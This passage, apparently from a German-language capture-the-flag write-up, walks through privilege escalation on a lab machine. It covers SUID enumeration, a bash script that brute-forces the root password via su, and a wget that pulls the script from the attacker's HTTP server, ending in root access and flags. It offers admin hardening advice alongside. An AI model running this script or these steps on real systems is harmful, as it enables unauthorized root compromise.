+                <strong>Analyse (SUID-Dateien):</strong> Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` listet alle Dateien (<code>-type f</code>) im gesamten Dateisystem (<code>/</code>) auf, bei denen das SUID-Bit gesetzt ist (<code>-perm -4000</code>). Die Option <code>-ls</code> sorgt für eine detaillierte Auflistung im `ls -dils`-Format, und `2>/dev/null` unterdrückt Fehlermeldungen (z.B. bei Verzeichnissen, auf die kein Zugriff besteht).
+                Die Liste enthält viele Standard-SUID-Binaries wie `su`, `sudo`, `passwd`, `pkexec`, `mount`, `umount`. Diese sind normalerweise sicher konfiguriert. Es gibt keine offensichtlich ungewöhnlichen oder benutzerdefinierten SUID-Dateien, die sofort als Schwachstelle ins Auge springen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (SUID-Dateien):</strong> Die gefundenen SUID-Dateien sind größtenteils Standard und bieten auf den ersten Blick keine einfache Privilegieneskalation, es sei denn, es gäbe eine bekannte Schwachstelle in einer der spezifischen Versionen dieser Tools auf dem System, die nicht gepatcht wurde, oder eine ungewöhnliche Konfiguration. Das Vorhandensein von `su` mit SUID-Bit ist normal und ermöglicht den Wechsel des Benutzers, wenn das Passwort bekannt ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong>
+                <ul>
+                    <li>Überprüfen Sie die Versionen der gefundenen SUID-Binaries (insbesondere `pkexec` für PwnKit/CVE-2021-4034, falls die Version anfällig ist, obwohl die Kernel-Version 5.10 relativ neu ist).</li>
+                    <li>Da `su` SUID root ist, könnte ein Brute-Force-Angriff auf das Root-Passwort direkt über `su` versucht werden, wenn es keine Sperrmechanismen gibt.</li>
+                    <li>Suchen Sie nach weiteren Privilegieneskalationsvektoren: Kernel-Version prüfen (`uname -a`) auf bekannte Exploits, Cronjobs (`cat /etc/crontab` und Dateien in `/etc/cron.*`), ungesicherte Konfigurationsdateien mit Passwörtern, Dienste die als root laufen und manipulierbar sind.</li>
+                </ul>
+                <br>
+                <strong>Empfehlung (Admin):</strong> Reduzieren Sie die Anzahl der SUID-Binaries auf das absolute Minimum. Überprüfen Sie regelmäßig, ob SUID-Binaries wirklich notwendig sind und ob sie sicher konfiguriert sind. Halten Sie das System und alle Pakete aktuell, um bekannte Schwachstellen in SUID-Programmen zu patchen.
+            </p>
+        </section> 
+	
+	 
+        <section id="privilege-escalation">  
+            <hr>
+            <p class="comment">
+                Da die Standard-SUID-Binaries auf den ersten Blick keine einfache Ausnutzung ermöglichen und `sudo -l` keine Rechte für `andrea` zeigte, überlege ich, ob das Root-Passwort möglicherweise schwach ist. Da der Name der Maschine "Bruteforcelab" ist, liegt die Vermutung nahe, dass Passwörter eine Rolle spielen. Ich erstelle ein einfaches Bash-Skript, um Jahreszahlen als Root-Passwort über `su` zu testen. Dies ist ein sehr spezifischer Brute-Force-Versuch, der auf der Annahme basiert, dass das Root-Passwort eine Jahreszahl sein könnte, was in CTFs manchmal vorkommt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~/Hackingtools] 
+└─# <span class="command">cat crack_su_password_num.sh</span></div>
+                    <pre>
+#!/bin/bash
+
+for i in {1990..2000}
+do 
+	     user="root"
+	     trysu=`echo "$i" | su root -c whoami 2>/dev/null` 
+  if [ "$trysu" ]; then
+    echo -e "verwende den User: \033[32m$user\033[0m und das passwort: \033[32m$i";
+    exit 0;
+  fi
+done
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (Brute-Force-Skript):</strong> Das Bash-Skript `crack_su_password_num.sh` iteriert durch die Zahlen von 1990 bis 2000. In jeder Iteration versucht es, mit der aktuellen Zahl `$i` als Passwort via `su root -c whoami` den Befehl `whoami` als `root` auszuführen.
+                <ul>
+                    <li>`echo "$i" | su root -c whoami`: Das Passwort `$i` wird an den `su`-Befehl übergeben.</li>
+                    <li>`-c whoami`: Führt `whoami` aus, wenn der Login erfolgreich ist.</li>
+                    <li>`2>/dev/null`: Unterdrückt Fehlermeldungen von `su` (z.B. "su: Authentication failure").</li>
+                    <li>`trysu=\`...\``: Speichert die Ausgabe von `whoami` (also "root", wenn erfolgreich) in der Variable `trysu`.</li>
+                    <li>`if [ "$trysu" ]; then ...`: Wenn `trysu` nicht leer ist (d.h. `whoami` wurde erfolgreich als `root` ausgeführt), wird das gefundene Passwort ausgegeben und das Skript beendet.</li>
+                </ul>
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Brute-Force-Skript):</strong> Dies ist ein sehr gezielter und schneller Brute-Force-Versuch für eine kleine Menge möglicher Passwörter. Es ist nur effektiv, wenn das Passwort tatsächlich in diesem kleinen Zahlenbereich liegt. Angesichts des Challenge-Namens ist es jedoch einen Versuch wert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Laden Sie dieses Skript auf das Zielsystem hoch (z.B. in `/tmp`), machen Sie es ausführbar und führen Sie es aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie niemals solch einfache oder erratbare Passwörter für den Root-Account (oder irgendeinen Account). Implementieren Sie Account-Sperrmechanismen nach mehreren fehlgeschlagenen Login-Versuchen, um Brute-Force-Angriffe zu erschweren, auch lokal via `su`.
+            </p>
+            <hr>
+            <p class="comment">
+                Ich lade das Skript `crack_su_password_num.sh` von meinem Angreifer-PC (wo ich einen einfachen Python-HTTP-Server auf Port 8555 gestartet habe) auf das Zielsystem in das Verzeichnis `/tmp`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">andrea@LAB-Bruteforce:/tmp$ <span class="command">wget http://192.168.2.114:8555/crack_su_password_num.sh</span></div>
+                    <pre>
+--2023-04-10 01:21:12--  [Link: http://192.168.2.114:8555/crack_su_password_num.sh | Ziel: http://192.168.2.114:8555/crack_su_password_num.sh] 
+Connecting to 192.168.2.114:8555... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 248 [text/x-sh]
+Saving to: ‘crack_su_password_num.sh ’
+
+crack_su_password_num.sh               100%[=============================>]     248  --.-KB/s    in 0s      
+
+2023-04-10 01:21:12 (108 MB/s) - ‘crack_su_password_num.sh ’ <span class="password">saved [248/248]</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (Skript-Download):</strong> Der `wget`-Befehl hat das Skript erfolgreich von meinem lokalen HTTP-Server heruntergeladen und in `/tmp` auf dem Zielsystem gespeichert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Skript-Download):</strong> Der Transfer war erfolgreich. Das Skript ist nun auf dem Zielsystem verfügbar.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass das Zielsystem ausgehende Verbindungen zu Ihrem HTTP-Server herstellen kann. `/tmp` ist oft ein guter Ort, um temporäre Dateien abzulegen, da es normalerweise für alle Benutzer beschreibbar ist.
+            </p>
+            <hr>
+            <p class="comment">
+                Ich mache das heruntergeladene Skript ausführbar und starte es.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">andrea@LAB-Bruteforce:/tmp$ <span class="command">chmod +x crack_su_password_num.sh</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">andrea@LAB-Bruteforce:/tmp$ <span class="command">./crack_su_password_num.sh</span></div>
+                    <pre>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<span class="password">User: root    --->>    passwort: 1998</span>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (Skript-Ausführung):</strong> Das Skript wurde mit `chmod +x` ausführbar gemacht und dann mit `./crack_su_password_num.sh` gestartet. Das Skript war erfolgreich und hat das Passwort `1998` für den Benutzer `root` gefunden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Skript-Ausführung):</strong> Volltreffer! Das Root-Passwort wurde durch diesen gezielten Brute-Force-Angriff aufgedeckt. Dies ist der Schlüssel zur vollständigen Kompromittierung des Systems. Die Annahme, dass das Passwort eine Jahreszahl sein könnte, war korrekt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort `1998`, um sich mit `su root` als Root-Benutzer anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Dies unterstreicht die Gefahr von schwachen und leicht erratbaren Passwörtern, insbesondere für den Root-Account. Ändern Sie das Root-Passwort sofort in ein starkes, einzigartiges Passwort. Implementieren Sie Account-Sperrmechanismen.
+            </p>
+            <hr>
+            <p class="comment">
+                Mit dem nun bekannten Root-Passwort `1998` wechsle ich den Benutzer zu `root`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">andrea@LAB-Bruteforce:/tmp$ <span class="command">su root</span></div>
+                    <pre>
+Password: <span class="password">1998</span>
+<span class="prompt-remote-root">root@LAB-Bruteforce:/tmp#</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (Root-Zugriff):</strong> Der Befehl `su root` wurde ausgeführt, und nach Eingabe des Passworts `1998` wurde der Benutzer erfolgreich zu `root` gewechselt. Der Prompt ändert sich zu `root@LAB-Bruteforce:/tmp#`, was den erfolgreichen Wechsel bestätigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Root-Zugriff):</strong> Fantastisch! Die vollständige Kompromittierung des Systems ist erreicht. Ich habe nun Root-Rechte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie nach der Root-Flag, die sich normalerweise im `/root`-Verzeichnis befindet. Dokumentieren Sie alle Schritte.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Das System ist als vollständig kompromittiert zu betrachten. Es sollte vom Netz genommen, forensisch untersucht und neu aufgesetzt werden. Alle identifizierten Schwachstellen (schwaches SSH-Passwort für `andrea`, extrem schwaches Root-Passwort) müssen im neu aufgesetzten System behoben werden.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/andrea/user.txt</div>
+                    <div class="flag-value"><span class="password">d5eb7d8b6f57c295e0bedf7eef531360</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">d5eb7d8b6f57c295e0bedf7eef531360</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. April 2023</p>
+    </footer>
+</body>
+</html>
